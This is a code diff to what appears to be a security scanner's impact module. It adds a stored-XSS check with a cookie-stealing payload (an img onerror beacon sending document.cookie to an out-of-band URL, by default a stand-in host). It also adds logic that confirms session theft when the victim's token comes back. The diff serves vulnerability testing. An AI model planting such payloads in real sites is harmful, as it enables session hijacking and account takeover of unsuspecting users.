@@ -208,6 +208,54 @@ async function ssrfMetadata(target, { fetchT }) {
   return null;
 }
 
+// ── Stored-XSS → session theft / account takeover (headless-assisted) ───────────────────────────────
+// The injected script runs in the VICTIM's authenticated browser and beacons document.cookie to an
+// out-of-band URL. Zero-FP anchor: theft is proven ONLY when the victim's OWN session token comes back
+// through that beacon — a value an attacker cannot produce unless the script truly executed in the
+// victim's session and read their cookie. An HttpOnly session cookie is unreadable by document.cookie,
+// so a properly-flagged session correctly yields NO proof (no false positive).
+export const cookieExfilPayload = (oobUrl) =>
+  `<img src=x onerror="new Image().src='${oobUrl}?c='+encodeURIComponent(document.cookie)">`;
+
+export function confirmSessionTheft({ observations = [], secret, target = '' }) {
+  if (!secret || secret.length < 8) return null; // need a real, high-entropy token to match on
+  const carries = (o) => {
+    if (typeof o !== 'string') return false;
+    if (o.includes(secret)) return true;
+    try {
+      return decodeURIComponent(o).includes(secret);
+    } catch {
+      return false;
+    }
+  };
+  if (!observations.some(carries)) return null;
+  const shown = `${secret.slice(0, 4)}…${secret.slice(-2)}`;
+  return F(
+    'impact-xss-session-theft',
+    'critical',
+    target,
+    `Stored-XSS ACCOUNT TAKEOVER PROVEN: the injected script executed in the victim's authenticated session, read document.cookie, and exfiltrated the victim's own session token (${shown}) out-of-band — a full session hijack. An HttpOnly session cookie would be unreadable here and correctly yields no proof.`,
+  );
+}
+
+// exfil(payload, target) → array of strings observed on the beacon channel when the victim rendered the
+// planted payload. Injected so the zero-FP core is unit-testable; the real implementation (proveXssExfil
+// in crawler-headless.mjs) plants into a stored-XSS sink and renders as the victim in a real browser.
+export async function runXssImpact({ targets = [], victimSecret, oobUrl = 'http://sx-exfil.invalid/b', exfil }) {
+  if (!victimSecret || typeof exfil !== 'function') return [];
+  const payload = cookieExfilPayload(oobUrl);
+  const findings = [];
+  for (const target of targets.slice(0, 5)) {
+    const observations = (await Promise.resolve(exfil(payload, target)).catch(() => [])) || [];
+    const f = confirmSessionTheft({ observations, secret: victimSecret, target });
+    if (f) {
+      findings.push(f);
+      break;
+    }
+  }
+  return findings;
+}
+
 // deps: { fetchT, injReq } from the engine (so injection stays method-aware + host-gated).
 export async function runImpact({ report, fetchT, injReq }) {
   const findings = [];
@@ -247,3 +295,4 @@ export async function runImpact({ report, fetchT, injReq }) {
 }
 
 export { sqliExtract, cmdContext, ssrfMetadata };
+// cookieExfilPayload, confirmSessionTheft, runXssImpact are exported inline above (XSS session-theft core).
